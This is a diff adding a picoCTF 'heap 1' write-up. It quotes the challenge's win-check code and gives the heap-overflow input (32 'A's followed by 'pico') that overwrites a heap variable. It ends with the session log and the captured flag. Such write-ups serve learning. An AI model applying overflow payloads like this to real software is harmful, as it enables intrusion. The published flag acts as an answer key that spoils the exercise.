@@ -504,6 +504,88 @@ Heap State:
 
 addr(pico)-addr(bico) => 0x20 or (32)base_10.
 
+## heap 1 {MEDIUM}
+
+Flag: ```picoCTF{starting_to_get_the_hang_21306688}```
+
+Hints Used: NONE
+
+it was similar to last challenge, the only difference was in the win condition
+
+```
+void check_win() {
+    if (!strcmp(safe_var, "pico")) {
+        printf("\nYOU WIN\n");
+
+        // Print flag
+        char buf[FLAGSIZE_MAX];
+        FILE *fd = fopen("flag.txt", "r");
+        fgets(buf, FLAGSIZE_MAX, fd);
+        printf("%s\n", buf);
+        fflush(stdout);
+
+        exit(0);
+    } else {
+        printf("Looks like everything is still secure!\n");
+        printf("\nNo flage for you :(\n");
+        fflush(stdout);
+    }
+}
+```
+
+the program was just comparing strings(safe_var, 'pico'), since the difference between the 2 addresses was same from the last chal, to get pico, i had to overflow the heap by 32chars first, and then add pico at the end of the input.
+
+therefore, i gave the input => ```AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAApico``` which gave me the flag.
+
+```
+Welcome to heap1!
+I put my data on the heap so it should be safe from any tampering.
+Since my data isn't on the stack I'll even let you write whatever info you want to the heap, I already took care of using malloc for you.
+
+Heap State:
++-------------+----------------+
+[*] Address   ->   Heap Data   
++-------------+----------------+
+[*]   0x61339265d2b0  ->   pico
++-------------+----------------+
+[*]   0x61339265d2d0  ->   bico
++-------------+----------------+
+
+1. Print Heap:          (print the current state of the heap)
+2. Write to buffer:     (write to your own personal block of data on the heap)
+3. Print safe_var:      (I'll even let you look at my variable on the heap, I'm confident it can't be modified)
+4. Print Flag:          (Try to print the flag, good luck)
+5. Exit
+
+Enter your choice: 2
+Data for buffer: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAApico
+
+1. Print Heap:          (print the current state of the heap)
+2. Write to buffer:     (write to your own personal block of data on the heap)
+3. Print safe_var:      (I'll even let you look at my variable on the heap, I'm confident it can't be modified)
+4. Print Flag:          (Try to print the flag, good luck)
+5. Exit
+
+Enter your choice: 3
+
+
+Take a look at my variable: safe_var = pico
+
+
+1. Print Heap:          (print the current state of the heap)
+2. Write to buffer:     (write to your own personal block of data on the heap)
+3. Print safe_var:      (I'll even let you look at my variable on the heap, I'm confident it can't be modified)
+4. Print Flag:          (Try to print the flag, good luck)
+5. Exit
+
+Enter your choice: 4
+
+YOU WIN
+picoCTF{starting_to_get_the_hang_21306688}
+```
+
+
+
 
 
 
